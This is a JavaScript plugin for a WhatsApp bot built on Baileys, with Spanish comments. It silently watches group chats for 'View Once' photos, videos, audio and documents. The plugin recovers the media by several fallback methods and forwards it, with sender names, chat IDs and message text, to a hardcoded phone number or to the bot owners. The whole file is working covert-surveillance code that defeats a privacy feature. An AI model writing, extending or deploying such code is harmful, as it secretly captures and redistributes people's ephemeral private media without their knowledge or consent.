const WATCH_GROUPS = new Set([])

const NOTIFY_JIDS = [
    '50492280729@s.whatsapp.net'
]

const SEEN_TTL_MS = 10 * 60 * 1000
const SEEN_LIMIT = 250

const SEND_VIEWONCE_CONTENT = true

export default {
    name: ["viewoncewatch", "vowatch"],
    help: ["viewoncewatch"],
    desc: "Monitorear y recuperar mensajes View Once",
    tags: ["owner"],
    group: true,
    owner: true,

    run: async ({ conn, m }) => {
        const targets = getNotifyTargets()

        await m.reply(
            `*Monitor ViewOnce*\n\n` +
            `Estado: activo\n` +
            `Grupos: ${[...WATCH_GROUPS].join("\n") || "todos los grupos"}\n` +
            `Avisos: ${targets.join(", ") || "sin destinatarios"}\n` +
            `Contenido: ${
                SEND_VIEWONCE_CONTENT
                    ? "reenviar contenido + información"
                    : "solo información"
            }`
        )
    },

    before: async (m, { conn }) => {
        try {
            if (!m?.isGroup) return false

            if (
                WATCH_GROUPS.size &&
                !WATCH_GROUPS.has(m.chat)
            ) {
                return false
            }

            const event = getViewOnceEvent(m)

            if (!event) return false

            /*
             * Evita que el propio bot vuelva a procesar
             * el ViewOnce que acaba de enviar.
             */
            if (
                m.fromMe &&
                event.place === "mensaje"
            ) {
                return false
            }

            const messageId =
                m.id ||
                m.key?.id ||
                ""

            const key = [
                m.chat,
                messageId,
                event.place,
                event.quotedId || ""
            ].join(":")

            if (seenBefore(conn, key)) {
                return false
            }

            const targets = getNotifyTargets()

            if (!targets.length) {
                return false
            }

            const chatName =
                await safeName(
                    conn,
                    m.chat
                )

            const senderName =
                await safeName(
                    conn,
                    m.sender
                )

            for (const jid of targets) {

                let contentResult = {
                    ok: false,
                    method: "",
                    sent: null,
                    error: null
                }

                /*
                 * =====================================================
                 * PRIMERO RECUPERAMOS EL CONTENIDO
                 * =====================================================
                 */

                if (SEND_VIEWONCE_CONTENT) {
                    contentResult =
                        await sendViewOnceContent(
                            conn,
                            jid,
                            event,
                            m
                        )
                }

                /*
                 * =====================================================
                 * DESPUÉS ENVIAMOS LA INFORMACIÓN
                 * =====================================================
                 */

                const lines = [
                    "*ViewOnce detectado*",
                    "",
                    `Origen: ${
                        event.place === "cita"
                            ? "respuesta citando View Once"
                            : "mensaje View Once"
                    }`,
                    `Chat: ${chatName}`,
                    `Chat ID: ${m.chat}`,
                    `Remitente: ${senderName}`,
                    `Sender ID: ${m.sender}`,
                    `Tipo: ${getFriendlyType(event.mediaType)}`,
                    `Wrapper: ${event.wrapper || "desconocido"}`,
                    `Mensaje ID: ${messageId || "-"}`,

                    event.quotedId
                        ? `Cita ID: ${event.quotedId}`
                        : "",

                    m.text
                        ? `Texto: ${truncate(m.text, 180)}`
                        : "",

                    SEND_VIEWONCE_CONTENT
                        ? (
                            contentResult.ok
                                ? `Contenido: reenviado (${contentResult.method})`
                                : "Contenido: no se pudo recuperar"
                        )
                        : "Contenido: reenvío desactivado"
                ].filter(Boolean)

                try {
                    await conn.sendMessage(
                        jid,
                        {
                            text: lines.join("\n")
                        },
                        contentResult.sent
                            ? {
                                quoted: contentResult.sent
                            }
                            : undefined
                    )
                } catch (error) {
                    console.error(
                        "[viewonce-monitor:info]",
                        jid,
                        error?.message || error
                    )
                }

                if (
                    !contentResult.ok &&
                    contentResult.error
                ) {
                    console.error(
                        "[viewonce-monitor:media]",
                        jid,
                        contentResult.error?.message ||
                        contentResult.error
                    )
                }
            }

        } catch (error) {
            console.error(
                "[viewonce-monitor]",
                error?.message || error
            )
        }

        return false
    }
}


/*
 * =========================================================
 * DESTINATARIOS
 * =========================================================
 */

function getNotifyTargets() {

    const configured =
        NOTIFY_JIDS
            .map(normalizeTargetJid)
            .filter(Boolean)

    if (configured.length) {
        return unique(configured)
    }

    const owners =
        Array.isArray(global.owner)
            ? global.owner
            : []

    return unique(
        owners
            .map(entry =>
                normalizeTargetJid(
                    Array.isArray(entry)
                        ? entry[0]
                        : entry
                )
            )
            .filter(Boolean)
    )
}


function normalizeTargetJid(value) {

    const raw =
        String(value || "").trim()

    if (!raw) return ""

    if (raw.includes("@")) {
        return raw
    }

    const number =
        raw.replace(/[^0-9]/g, "")

    return number
        ? `${number}@s.whatsapp.net`
        : ""
}


/*
 * =========================================================
 * DETECCIÓN VIEW ONCE
 * =========================================================
 */

function getViewOnceEvent(m) {

    /*
     * ---------------------------------------------------------
     * VIEW ONCE DIRECTO
     * ---------------------------------------------------------
     */

    const direct =
        detectViewOnceMessage(
            m?.message
        )

    if (direct) {
        return {
            ...direct,

            place: "mensaje",

            quotedId: "",

            webMessage:
                getWebMessage(m),

            serialized: m
        }
    }


    /*
     * ---------------------------------------------------------
     * key.isViewOnce
     * ---------------------------------------------------------
     */

    if (m?.key?.isViewOnce) {

        const innerMessage =
            normalizeInnerMessage(
                m?.message
            )

        return {
            wrapper: "key.isViewOnce",

            mediaType:
                firstMessageType(
                    innerMessage
                ) ||
                m?.mediaType ||
                "",

            innerMessage,

            place: "mensaje",

            quotedId: "",

            webMessage:
                getWebMessage(m),

            serialized: m
        }
    }


    /*
     * ---------------------------------------------------------
     * VIEW ONCE CITADO
     * ---------------------------------------------------------
     */

    const contextInfo =
        getContextInfo(m)

    const q =
        m?.quoted

    const quotedWebMessage =
        q?.vM ||
        q?.fakeObj ||
        null

    const quotedMessage =
        contextInfo?.quotedMessage ||
        quotedWebMessage?.message ||
        q?.message ||
        makeMessageFromSerialized(q)

    const quotedInfo =
        detectViewOnceMessage(
            quotedMessage
        )

    if (!quotedInfo) {
        return null
    }

    return {
        ...quotedInfo,

        place: "cita",

        quotedId:
            contextInfo?.stanzaId ||
            q?.id ||
            q?.key?.id ||
            "",

        webMessage:
            quotedWebMessage ||
            buildQuotedWebMessage(
                m,
                contextInfo,
                quotedMessage,
                q
            ),

        serialized:
            q || null
    }
}


/*
 * =========================================================
 * BUSCADOR RECURSIVO
 * =========================================================
 */

function detectViewOnceMessage(
    message,
    depth = 0
) {

    if (
        !message ||
        typeof message !== "object" ||
        depth > 15
    ) {
        return null
    }


    /*
     * Wrappers oficiales.
     */

    for (
        const wrapper of [
            "viewOnceMessage",
            "viewOnceMessageV2",
            "viewOnceMessageV2Extension"
        ]
    ) {

        const inner =
            message?.[wrapper]?.message

        if (
            inner &&
            typeof inner === "object"
        ) {
            return {
                wrapper,

                mediaType:
                    getMediaType(inner),

                innerMessage:
                    inner
            }
        }
    }


    /*
     * ViewOnce directamente dentro
     * de image/video/audio/document.
     */

    for (
        const type of [
            "imageMessage",
            "videoMessage",
            "audioMessage",
            "documentMessage"
        ]
    ) {

        const node =
            message?.[type]

        if (
            node &&
            typeof node === "object" &&
            (
                node.viewOnce ||
                node.isViewOnce
            )
        ) {
            return {
                wrapper: "media.viewOnce",

                mediaType: type,

                innerMessage:
                    message
            }
        }
    }


    /*
     * Algunos mensajes llegan envueltos.
     */

    for (
        const wrapper of [
            "ephemeralMessage",
            "documentWithCaptionMessage",
            "editedMessage",
            "deviceSentMessage",
            "futureproofMessage"
        ]
    ) {

        const inner =
            message?.[wrapper]?.message

        const found =
            detectViewOnceMessage(
                inner,
                depth + 1
            )

        if (found) {
            return found
        }
    }

    return null
}


/*
 * =========================================================
 * RECUPERAR Y ENVIAR CONTENIDO
 * =========================================================
 */

async function sendViewOnceContent(
    conn,
    target,
    event,
    m
) {

    let copyError = null

    /*
     * =====================================================
     * MÉTODO 1
     *
     * copyNForward + readViewOnce
     *
     * ESTE ES EL MÉTODO MÁS IMPORTANTE.
     * =====================================================
     */

    if (
        event?.innerMessage &&
        typeof conn?.copyNForward === "function"
    ) {

        try {

            const source =
                buildForwardableMessage(
                    event.webMessage,
                    event.innerMessage,
                    m,
                    event
                )

            if (source) {

                const sent =
                    await conn.copyNForward(
                        target,
                        source,
                        true,
                        {
                            readViewOnce: true
                        }
                    )

                if (sent) {

                    return {
                        ok: true,

                        method:
                            "copyNForward/readViewOnce",

                        sent,

                        error: null
                    }
                }
            }

        } catch (error) {

            copyError = error

            console.error(
                "[viewonce-monitor:copyNForward]",
                error?.message || error
            )
        }
    }


    /*
     * =====================================================
     * MÉTODO 2
     *
     * download(true) del serializer
     * =====================================================
     */

    const fallback =
        await sendMediaFallback(
            conn,
            target,
            event
        )

    if (fallback.ok) {
        return fallback
    }


    /*
     * =====================================================
     * MÉTODO 3
     *
     * downloadContentFromMessage()
     * =====================================================
     */

    const direct =
        await sendDirectBaileysMedia(
            conn,
            target,
            event
        )

    if (direct.ok) {
        return direct
    }


    return {
        ok: false,

        method: "",

        sent: null,

        error:
            direct.error ||
            fallback.error ||
            copyError ||
            new Error(
                "Contenido ViewOnce no disponible"
            )
    }
}


/*
 * =========================================================
 * FALLBACK DOWNLOAD()
 * =========================================================
 */

async function sendMediaFallback(
    conn,
    target,
    event
) {

    const source =
        event?.serialized

    /*
     * También intentamos el mensaje WebMessage
     * por si el serializer principal no tiene download.
     */

    const candidates = [
        source,
        event?.webMessage,
        source?.msg,
        source?.message
    ]

    const downloader =
        candidates.find(
            item =>
                item &&
                typeof item.download === "function"
        )

    if (!downloader) {

        return {
            ok: false,
            method: "",
            sent: null,

            error:
                new Error(
                    "No existe download() en el mensaje"
                )
        }
    }

    let file = null

    try {

        /*
         * true hace que algunos serializers
         * descarguen físicamente el archivo.
         */

        file =
            await downloader.download(true)

        if (!file) {
            throw new Error(
                "download() no devolvió contenido"
            )
        }

        const media =
            typeof file === "string"
                ? {
                    url: file
                }
                : file

        const type =
            normalizeMediaType(
                event.mediaType,
                media?.mimetype,
                downloader?.mimetype
            )

        const caption =
            getCaption(
                event,
                downloader
            )


        /*
         * IMAGEN
         */

        if (type === "image") {

            const sent =
                await conn.sendMessage(
                    target,
                    {
                        image: media,
                        caption
                    }
                )

            return {
                ok: true,
                method: "download/image",
                sent,
                error: null
            }
        }


        /*
         * VIDEO
         */

        if (type === "video") {

            const sent =
                await conn.sendMessage(
                    target,
                    {
                        video: media,
                        caption
                    }
                )

            return {
                ok: true,
                method: "download/video",
                sent,
                error: null
            }
        }


        /*
         * AUDIO
         */

        if (type === "audio") {

            const audioNode =
                getMediaNode(
                    event.innerMessage,
                    "audioMessage"
                ) ||
                downloader?.msg ||
                downloader

            const sent =
                await conn.sendMessage(
                    target,
                    {
                        audio: media,

                        mimetype:
                            audioNode?.mimetype ||
                            "audio/mpeg",

                        ptt:
                            Boolean(
                                audioNode?.ptt
                            )
                    }
                )

            return {
                ok: true,
                method: "download/audio",
                sent,
                error: null
            }
        }


        /*
         * DOCUMENTO
         */

        if (type === "document") {

            const documentNode =
                getMediaNode(
                    event.innerMessage,
                    "documentMessage"
                ) ||
                downloader?.msg ||
                downloader

            const sent =
                await conn.sendMessage(
                    target,
                    {
                        document: media,

                        mimetype:
                            documentNode?.mimetype ||
                            "application/octet-stream",

                        fileName:
                            documentNode?.fileName ||
                            "archivo"
                    }
                )

            return {
                ok: true,
                method: "download/document",
                sent,
                error: null
            }
        }


        throw new Error(
            `Tipo no soportado: ${
                event.mediaType ||
                "desconocido"
            }`
        )

    } catch (error) {

        return {
            ok: false,
            method: "",
            sent: null,
            error
        }

    } finally {

        if (
            typeof file === "string"
        ) {

            await import("fs")
                .then(fs =>
                    fs.promises
                        .unlink(file)
                        .catch(() => {})
                )
        }
    }
}


/*
 * =========================================================
 * DESCARGA DIRECTA BAILEYS
 * =========================================================
 */

async function sendDirectBaileysMedia(
    conn,
    target,
    event
) {

    try {

        const {
            downloadContentFromMessage
        } =
            await import(
                "@whiskeysockets/baileys"
            )

        const type =
            normalizeMediaType(
                event?.mediaType
            )

        if (!type) {
            throw new Error(
                "Tipo multimedia desconocido"
            )
        }

        const media =
            getMediaNode(
                event?.innerMessage,
                `${type}Message`
            )

        if (!media) {
            throw new Error(
                `No se encontró ${type}Message`
            )
        }

        const stream =
            await downloadContentFromMessage(
                media,
                type
            )

        const chunks = []

        for await (
            const chunk of stream
        ) {
            chunks.push(chunk)
        }

        const buffer =
            Buffer.concat(chunks)

        if (!buffer.length) {
            throw new Error(
                "Baileys devolvió un buffer vacío"
            )
        }

        const caption =
            media.caption ||
            ""

        /*
         * IMAGEN
         */

        if (type === "image") {

            const sent =
                await conn.sendMessage(
                    target,
                    {
                        image: buffer,
                        caption
                    }
                )

            return {
                ok: true,
                method:
                    "downloadContentFromMessage/image",
                sent,
                error: null
            }
        }


        /*
         * VIDEO
         */

        if (type === "video") {

            const sent =
                await conn.sendMessage(
                    target,
                    {
                        video: buffer,
                        caption
                    }
                )

            return {
                ok: true,
                method:
                    "downloadContentFromMessage/video",
                sent,
                error: null
            }
        }


        /*
         * AUDIO
         */

        if (type === "audio") {

            const sent =
                await conn.sendMessage(
                    target,
                    {
                        audio: buffer,

                        mimetype:
                            media.mimetype ||
                            "audio/mpeg",

                        ptt:
                            Boolean(
                                media.ptt
                            )
                    }
                )

            return {
                ok: true,
                method:
                    "downloadContentFromMessage/audio",
                sent,
                error: null
            }
        }


        /*
         * DOCUMENTO
         */

        if (type === "document") {

            const sent =
                await conn.sendMessage(
                    target,
                    {
                        document: buffer,

                        mimetype:
                            media.mimetype ||
                            "application/octet-stream",

                        fileName:
                            media.fileName ||
                            "archivo"
                    }
                )

            return {
                ok: true,
                method:
                    "downloadContentFromMessage/document",
                sent,
                error: null
            }
        }

        throw new Error(
            "Tipo multimedia no soportado"
        )

    } catch (error) {

        return {
            ok: false,
            method: "",
            sent: null,
            error
        }
    }
}


/*
 * =========================================================
 * CONSTRUIR MENSAJE PARA copyNForward
 * =========================================================
 */

function buildForwardableMessage(
    webMessage,
    innerMessage,
    m,
    event
) {

    if (
        !innerMessage ||
        typeof innerMessage !== "object"
    ) {
        return null
    }

    const sourceKey =
        webMessage?.key ||
        {}

    const key = {
        remoteJid:
            sourceKey.remoteJid ||
            m?.chat,

        fromMe:
            Boolean(
                sourceKey.fromMe
            ),

        id:
            sourceKey.id ||
            event?.quotedId ||
            m?.id ||
            m?.key?.id ||
            `VIEWONCE-${Date.now()}`
    }


    const participant =
        sourceKey.participant ||
        webMessage?.participant ||
        (
            event?.place === "cita"
                ? m?.quoted?.sender
                : m?.sender
        )

    if (participant) {
        key.participant =
            participant
    }


    /*
     * IMPORTANTE:
     *
     * Volvemos a colocar el contenido
     * dentro de viewOnceMessage.
     *
     * copyNForward(..., { readViewOnce: true })
     * se encarga de leerlo y mandarlo
     * como mensaje multimedia normal.
     */

    const result = {
        key,

        message: {
            viewOnceMessage: {
                message:
                    innerMessage
            }
        }
    }


    const timestamp =
        webMessage?.messageTimestamp ||
        m?.messageTimestamp

    if (timestamp != null) {
        result.messageTimestamp =
            timestamp
    }


    if (webMessage?.pushName) {
        result.pushName =
            webMessage.pushName
    }

    return result
}


/*
 * =========================================================
 * MENSAJES CITADOS
 * =========================================================
 */

function getWebMessage(m) {

    return (
        m?.vM ||
        m?.fakeObj ||
        m ||
        null
    )
}


function buildQuotedWebMessage(
    m,
    contextInfo,
    quotedMessage,
    q
) {

    if (!quotedMessage) {
        return null
    }

    const participant =
        contextInfo?.participant ||
        q?.sender ||
        ""

    const key = {
        remoteJid:
            m?.chat,

        fromMe:
            Boolean(
                q?.fromMe
            ),

        id:
            contextInfo?.stanzaId ||
            q?.id ||
            q?.key?.id ||
            `QUOTED-${Date.now()}`
    }

    if (participant) {
        key.participant =
            participant
    }

    return {
        key,

        message:
            quotedMessage,

        ...(participant
            ? {
                participant
            }
            : {})
    }
}


function makeMessageFromSerialized(q) {

    if (
        !q ||
        typeof q !== "object"
    ) {
        return null
    }

    if (
        q.mtype &&
        q.msg
    ) {
        return {
            [q.mtype]:
                q.msg
        }
    }

    if (
        q.mediaType &&
        q.msg
    ) {
        return {
            [q.mediaType]:
                q.msg
        }
    }

    return null
}


/*
 * =========================================================
 * NORMALIZAR WRAPPERS
 * =========================================================
 */

function normalizeInnerMessage(
    message
) {

    if (
        !message ||
        typeof message !== "object"
    ) {
        return null
    }

    for (
        const wrapper of [
            "ephemeralMessage",
            "documentWithCaptionMessage",
            "editedMessage",
            "deviceSentMessage",
            "futureproofMessage"
        ]
    ) {

        if (
            message?.[wrapper]?.message
        ) {

            return normalizeInnerMessage(
                message[wrapper].message
            )
        }
    }

    return message
}


/*
 * =========================================================
 * CONTEXT INFO
 * =========================================================
 */

function getContextInfo(m) {

    if (
        m?.msg?.contextInfo
    ) {
        return m.msg.contextInfo
    }

    return findContextInfo(
        m?.message
    )
}


function findContextInfo(
    message,
    depth = 0
) {

    if (
        !message ||
        typeof message !== "object" ||
        depth > 10
    ) {
        return null
    }

    for (
        const type of [
            "imageMessage",
            "videoMessage",
            "audioMessage",
            "documentMessage",
            "extendedTextMessage"
        ]
    ) {

        if (
            message?.[type]?.contextInfo
        ) {

            return message[type]
                .contextInfo
        }
    }


    for (
        const wrapper of [
            "ephemeralMessage",
            "documentWithCaptionMessage",
            "editedMessage",
            "deviceSentMessage",
            "futureproofMessage"
        ]
    ) {

        const found =
            findContextInfo(
                message?.[wrapper]?.message,
                depth + 1
            )

        if (found) {
            return found
        }
    }

    return null
}


/*
 * =========================================================
 * UTILIDADES MEDIA
 * =========================================================
 */

function getMediaType(message) {

    if (
        !message ||
        typeof message !== "object"
    ) {
        return ""
    }

    return (
        [
            "imageMessage",
            "videoMessage",
            "audioMessage",
            "documentMessage"
        ].find(
            type =>
                message[type] != null
        ) || ""
    )
}


function getMediaNode(
    message,
    wantedType
) {

    if (
        !message ||
        typeof message !== "object"
    ) {
        return null
    }

    if (message[wantedType]) {
        return message[wantedType]
    }

    const type =
        getMediaType(message)

    if (
        type &&
        message[type]
    ) {
        return message[type]
    }

    return null
}


function normalizeMediaType(
    type,
    mime = "",
    fallback = ""
) {

    const value =
        String(
            type ||
            ""
        )

    if (
        value === "imageMessage" ||
        value === "image"
    ) {
        return "image"
    }

    if (
        value === "videoMessage" ||
        value === "video"
    ) {
        return "video"
    }

    if (
        value === "audioMessage" ||
        value === "audio"
    ) {
        return "audio"
    }

    if (
        value === "documentMessage" ||
        value === "document"
    ) {
        return "document"
    }


    const mimeType =
        String(
            mime ||
            fallback ||
            ""
        )

    if (/^image\//i.test(mimeType)) {
        return "image"
    }

    if (/^video\//i.test(mimeType)) {
        return "video"
    }

    if (/^audio\//i.test(mimeType)) {
        return "audio"
    }

    if (
        /^application\//i.test(
            mimeType
        )
    ) {
        return "document"
    }

    return ""
}


function getFriendlyType(type) {

    switch (type) {

        case "imageMessage":
            return "imagen"

        case "videoMessage":
            return "video"

        case "audioMessage":
            return "audio"

        case "documentMessage":
            return "documento"

        default:
            return type || "desconocido"
    }
}


/*
 * =========================================================
 * CAPTION
 * =========================================================
 */

function getCaption(
    event,
    source
) {

    const inner =
        event?.innerMessage ||
        {}

    return (
        inner?.imageMessage?.caption ||
        inner?.videoMessage?.caption ||
        inner?.documentMessage?.caption ||
        source?.caption ||
        source?.text ||
        ""
    )
}


/*
 * =========================================================
 * ANTI DUPLICADOS
 * =========================================================
 */

function seenBefore(
    conn,
    key
) {

    const now =
        Date.now()

    const seen =
        conn._viewOnceMonitorSeen ||
        (
            conn._viewOnceMonitorSeen =
                new Map()
        )


    for (
        const [id, at] of seen
    ) {

        if (
            !at ||
            now - at >
                SEEN_TTL_MS
        ) {
            seen.delete(id)
        }
    }


    if (seen.has(key)) {
        return true
    }


    seen.set(
        key,
        now
    )


    while (
        seen.size >
        SEEN_LIMIT
    ) {

        seen.delete(
            seen.keys()
                .next()
                .value
        )
    }

    return false
}


/*
 * =========================================================
 * UTILIDADES GENERALES
 * =========================================================
 */

async function safeName(
    conn,
    jid
) {

    try {
        return await conn.getName(
            jid
        )
    } catch {
        return jid
    }
}


function truncate(
    value,
    max
) {

    const text =
        String(
            value || ""
        )
            .replace(
                /\s+/g,
                " "
            )
            .trim()

    return (
        text.length > max
            ? `${text.slice(
                0,
                max - 3
            )}...`
            : text
    )
}


function unique(values) {

    return [
        ...new Set(
            values.filter(Boolean)
        )
    ]
}
